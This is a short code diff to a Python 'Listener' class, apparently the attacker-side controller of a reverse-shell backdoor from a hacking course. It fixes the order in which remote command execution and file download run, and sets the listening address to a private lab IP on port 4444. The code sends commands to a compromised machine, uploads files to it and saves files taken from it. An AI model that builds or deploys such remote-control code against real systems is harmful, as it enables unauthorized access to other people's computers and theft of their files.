@@ -54,10 +54,11 @@ class Listener:
                     file_content = self.read_file(command[1]).decode()
                     command.append(file_content)
 
+                result = self.execute_remotely(command)
+
                 if command[0] == "download":
                     result = self.write_file(command[1], result)
 
-                result = self.execute_remotely(command)
             except Exception:
                 result = "[-] Error during command execution."
 
@@ -65,6 +66,5 @@ class Listener:
 
 
 if __name__ == '__main__':
-    my_listener = Listener("192.168.152.129", 4444)
+    my_listener = Listener("192.168.152.128", 4444)
     my_listener.run()
-
